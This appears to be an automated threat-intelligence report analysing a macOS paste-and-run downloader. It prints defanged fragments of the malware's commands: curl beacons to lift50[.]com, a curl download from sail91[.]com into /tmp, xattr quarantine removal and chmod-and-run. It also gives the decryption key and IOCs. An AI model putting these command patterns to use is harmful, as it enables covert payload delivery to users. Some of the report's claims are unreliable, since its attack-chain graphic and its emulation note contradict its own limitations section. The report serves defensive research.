---
title: "Malware Analysis: Unknown macOS downloader (paste-and-run / ClickFix delivery) (other · zsh · ae02f57c)"
published: 2026-10-28
draft: false
description: "Malicious (low confidence): Unknown macOS downloader (paste-and-run / ClickFix delivery) · loader/downloader · difficulty medium · pure static analysis"
tags: ["loader", "downloader", "Script"]
category: "恶意样本日报"
lang: "en"
translationOf: "2026-10-28-macos-downloader-ae02f57c"
---

> [!WARNING]
> **Verdict: malicious** · Family **Unknown macOS downloader (paste-and-run / ClickFix delivery)** (uncertain) · Confidence **low**
> 
> Aliases: ClickFix macOS stager, paste-and-run loader
> 
> The sample is a zsh script aimed at macOS: it first performs hardware/Rosetta reconnaissance, then derives an AES-128-CTR key from md5(2218) to decrypt an embedded gzip, yielding a second zsh script; that script reports a `pasted` event to lift50[.]com, downloads the next-stage program from sail91[.]com to /tmp/.mfa8aus, clears the quarantine attribute with xattr -c, runs it after chmod +x, and reports a `stager` event once more. Both the decryption and the code reading were performed directly in this environment.

## Overview

| Item | Content |
|:--|:--|
| Family | **Unknown macOS downloader (paste-and-run / ClickFix delivery)** · aliases ClickFix macOS stager, paste-and-run loader · _uncertain_ |
| Confidence | **low** |
| Behaviour class | loader · downloader |
| Difficulty | medium |
| First seen | 2026-10-28 14:28:40 |
| Analysis method | pure static analysis |
| Source | [MalwareBazaar](https://bazaar.abuse.ch/sample/ae02f57c450feae937209022b742fc1fb7af5896b42c4183beed4ed67388a13b/) |

## Attack chain

<svg viewBox="0 0 720 226" width="100%" role="img" aria-label="Attack chain overview" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="150" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="38" fill="currentColor" font-weight="600" font-size="14">Config decryption</text>
<text x="250" y="38" fill="currentColor" fill-opacity="0.65" font-size="12.5">AES decrypts embedded config</text>
<text x="250" y="56" fill="currentColor" fill-opacity="0.4" font-size="11" font-family="ui-monospace,monospace">T1027</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="92" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="96" fill="currentColor" font-weight="600" font-size="14">Connect to C2</text>
<text x="250" y="96" fill="currentColor" fill-opacity="0.65" font-size="12.5">Raw TCP to hardcoded C2</text>
<text x="250" y="114" fill="currentColor" fill-opacity="0.4" font-size="11" font-family="ui-monospace,monospace">T1095</text>
<text x="613" y="96" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="150" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="154" fill="currentColor" font-weight="600" font-size="14">Remote control / theft</text>
<text x="250" y="154" fill="currentColor" fill-opacity="0.65" font-size="12.5">shell / keystrokes / screenshots / webcam</text>
<text x="250" y="172" fill="currentColor" fill-opacity="0.4" font-size="11" font-family="ui-monospace,monospace">T1059</text>
<text x="613" y="154" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
</svg>

## Sample identity

| Item | Value |
|:--|:--|
| SHA-256 | `ae02f57c450feae937209022b742fc1fb7af5896b42c4183beed4ed67388a13b` |
| MD5 | _not recorded_ |
| Size | 2,976 bytes (2.9 KB) |
| Type | other · `zsh` |

## Behaviour analysis

**8** behaviours were recovered, each with supporting evidence, and all of them are static.

### 1. Collects hardware and Rosetta status

`T1082` · confidence **high** · static

Collects the model, architecture and memory through sysctl hw.model, uname -m and sysctl hw.memsize, and on x86_64 uses pgrep oahd to determine whether it is running under Rosetta, then outputs an hw line.

> **Evidence**: sysctl calls at file offsets 1063/1107/1140 and pgrep oahd at offset 1251
> 
> **Source**: `ev-000001`

### 2. Decrypts the embedded compressed payload

`T1140` · confidence **high** · static

Concatenates the three hex segments _rollout_key/_probe_salt/_build_tag and restores them to binary with xxd -r -p, decrypts with AES-128-CTR using md5("2218") as the key and an all-zero IV, then gunzips the result to obtain the second-stage script and executes it with zsh -c.

> **Evidence**: _k=$(_kb|md5), openssl enc -d -aes-128-ctr, gunzip and /bin/zsh -c "$_r" at file offsets 2781-2958
> 
> **Source**: `ev-000001` · `ev-000002`

### 3. Obfuscates command names to evade detection

`T1027` · confidence **high** · static

Uses printf octal escapes to assemble command names such as md5, xxd, openssl, curl, xattr and chmod so that no plaintext command appears in the script, and concatenates g+unzip into gunzip.

> **Evidence**: mzkh1/olmhf/k9mv5 and vwrn='g'+dn1r='unzip' at file offsets 1483-1601; the same technique appears in the second stage
> 
> **Source**: `ev-000001` · `ev-000002`

### 4. Reports the paste-and-run beacon

`T1071.001` · confidence **high** · static

Sends a curl POST to lift50[.]com/api/metrics/run?event=pasted with user and BuildID headers, executed silently in the background, to mark that the user has pasted and run the code in a terminal.

> **Evidence**: first curl in the decrypted second stage: -X POST -H 'user: AgKG...' -H 'BuildID: AgLp...' hxxps://lift50[.]com/api/metrics/run?event=pasted
> 
> **Source**: `ev-000002`

### 5. Downloads the next-stage program

`T1105` · confidence **high** · static

Uses curl -fsSL to download sail91[.]com/f/rjcf4ggdrb1wp5syzplnda/5r7r2qc0 to /tmp/.mfa8aus.$$.

> **Evidence**: decrypted second stage curl -fsSL -o /tmp/.mfa8aus.$$ hxxps://sail91[.]com/f/...
> 
> **Source**: `ev-000002`

### 6. Removes the quarantine attribute

`T1553.001` · confidence **high** · static

Once the download completes it first uses mv to drop the .$$ suffix, then runs xattr -c /tmp/.mfa8aus to clear the macOS quarantine attribute, bypassing Gatekeeper's blocking of downloaded files.

> **Evidence**: decrypted second stage mv ... && xattr -c /tmp/.mfa8aus
> 
> **Source**: `ev-000002`

### 7. Makes the payload executable and runs it

`T1059.004` · confidence **high** · static

After chmod +x /tmp/.mfa8aus it executes the downloaded next-stage program directly by that path, completing payload loading.

> **Evidence**: decrypted second stage chmod +x ${xw8b57} && ${xw8b57}
> 
> **Source**: `ev-000002`

### 8. Reports the stager-complete beacon

`T1071.001` · confidence **high** · static

Before executing the next stage it sends a second set of user/BuildID headers via curl POST to lift50[.]com/api/metrics/run?event=stager, marking the downloader stage as complete.

> **Evidence**: decrypted second stage curl -X POST -H 'user: AgJO...' -H 'BuildID: AgIL...' hxxps://lift50[.]com/api/metrics/run?event=stager
> 
> **Source**: `ev-000002`


## IOC (defanged)

### Network

:::caution
**Still unverified on the real server side**: the connections/handshakes above were completed with a locally controlled emulation service; the real C2's responses and delivered content remain unknown.
:::

| Type | Value | Port | Role | Evidence source | Dynamic observation |
|:--|:--|--:|:--|:--|:--|
| https | `hxxps://lift50[.]com/api/metrics/run?event=pasted` | 443 | c2 | static | ⏳ not observed |
| https | `hxxps://lift50[.]com/api/metrics/run?event=stager` | 443 | c2 | static | ⏳ not observed |
| https | `hxxps://sail91[.]com/f/rjcf4ggdrb1wp5syzplnda/5r7r2qc0` | 443 | download | static | ⏳ not observed |

### Host

**Drop paths**

- `/tmp/.mfa8aus.$$`
- `/tmp/.mfa8aus`

### Configuration

| Key | Value | Required | Evidence source |
|:--|:--|:--|:--|
| `c2_hosts` | `lift50[.]com` | yes | static |
| `download_url` | `hxxps://sail91[.]com/f/rjcf4ggdrb1wp5syzplnda/5r7r2qc0` | yes | static |
| `install_path` | `/tmp/.mfa8aus` | yes | static |
| `encryption_algo` | `AES-128-CTR, key=md5("2218"), IV=16 zero bytes; plaintext is gzip` | yes | static |
| `beacon_events` | `pasted, stager` | yes | static |
| `http_headers` | `user: AgKG9kv7... / BuildID: AgLpxGoL... (first beacon); user: AgJOHUea... / BuildID: AgILJwHJ... (second beacon)` | no | static |

## Don't misread this

:::important
The following conclusions are **easy to get wrong**; keep them in mind when citing this report.

- Do not assert that the final payload is a stealer or ransomware: only the second-stage downloader was obtained, and the Mach-O corresponding to /tmp/.mfa8aus was neither downloaded nor analysed.
- Do not assert that persistence exists: the static code contains no LaunchAgent, LaunchDaemon, login item or scheduled task writes.
- Do not assert that the sample has anti-VM/anti-sandbox capability: the hardware and Rosetta probe results are only printed and do not feed any termination or evasion branch.
- Do not assert the full purpose of lift50[.]com or sail91[.]com: they are judged to be beacons and payload distribution only from the request semantics, and no real responses were observed.
:::

## Analysis method and limitations

| Item | Content |
|:--|:--|
| Analysis method | pure static analysis |
| Unpacked | no |

**Limitations and open questions**

1. Pure static analysis: the sample was neither executed nor emulated; all C2 and host indicators come from static decryption, with recoverability=static and pending_dynamic_verify=true.
2. The next-stage program on sail91[.]com was not downloaded, so the payload type, family attribution and final behaviour (stealing/backdoor/persistence) cannot be confirmed.
3. No server response was obtained, so it cannot be verified whether the beacon format (user/BuildID tokens) corresponds to victim identifiers or campaign numbers.
4. The sample targets macOS and this environment has no matching isolated dynamic channel, so reproduced=false.

## Evidence index

<details>
<summary>Show 2 tool evidence records</summary>

| Evidence ID | Tool | Summary |
|:--|:--|:--|
| `ev-000001` | string extraction | Extracted 38 ASCII strings and located the file offsets of the hardware reconnaissance, octal command-name obfuscation, AES-CTR decryption and zsh -c execution code. |
| `ev-000002` | evidence.record | Statically decrypted the embedded payload and decompressed it to obtain the second-stage zsh downloader (sha256 cb0062fa...), decoding the lift50[.]com beacons, the sail91[.]com download URL and the /tmp/.mfa8aus staging path. |

</details>

---

_This sample is not shared; IOCs are defanged. For security research only._
